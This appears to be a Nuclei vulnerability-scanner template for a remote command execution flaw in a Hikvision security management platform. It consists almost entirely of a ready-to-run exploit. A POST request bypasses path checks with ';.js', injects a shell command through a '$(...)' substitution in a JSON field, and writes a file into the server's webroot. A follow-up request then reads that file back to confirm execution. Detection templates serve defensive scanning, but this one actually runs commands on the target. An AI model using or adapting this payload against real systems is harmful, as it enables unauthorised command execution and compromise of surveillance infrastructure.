id: hikvision-detection-rce
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 海康威视部分综合安防管理平台历史版本由于接口校验不足，由于接口效验不完整导致其远程命令执行
  reference:
    - https://mp.weixin.qq.com/s/vkuA49ZscwdExxYMnYiXbQ
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - raw:
      - |-
        POST /center/api/installation/detection;.js  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/json
        Content-Length: 346

        {"type": "environment", "operate": "", "machines": {"id":"$(echo zhizhuo>/opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{{filename}}.txt)"}}
      - |-
        GET /{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        Accept: text/plain, */*; q=0.01
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
    matchers:
      - type: word
        part: body
        words:
          - 'zhizhuo'
#.jsp